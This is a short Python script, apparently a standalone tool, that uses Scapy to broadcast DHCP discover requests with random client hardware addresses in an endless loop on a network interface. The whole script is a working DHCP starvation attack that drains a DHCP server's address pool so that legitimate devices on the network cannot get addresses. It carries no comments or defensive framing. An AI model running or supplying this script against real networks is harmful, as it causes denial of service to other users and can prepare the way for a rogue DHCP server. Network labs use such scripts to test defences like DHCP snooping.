from scapy.all import *

conf.checkIPaddr = False

ether_packet = Ether(dst='ff:ff:ff:ff:ff:ff')
ip_packet = IP(src="0.0.0.0", dst="255.255.255.255")
udp = UDP(sport=68, dport = 67)
bootp = BOOTP(op=1, chaddr=RandMAC())
dhcp = DHCP(options=[("message-type","discover"),"end"])

DHCP_packet = ether_packet/ip_packet/udp/bootp/dhcp

sendp(DHCP_packet, iface='eth0', verbose = False, loop=1)
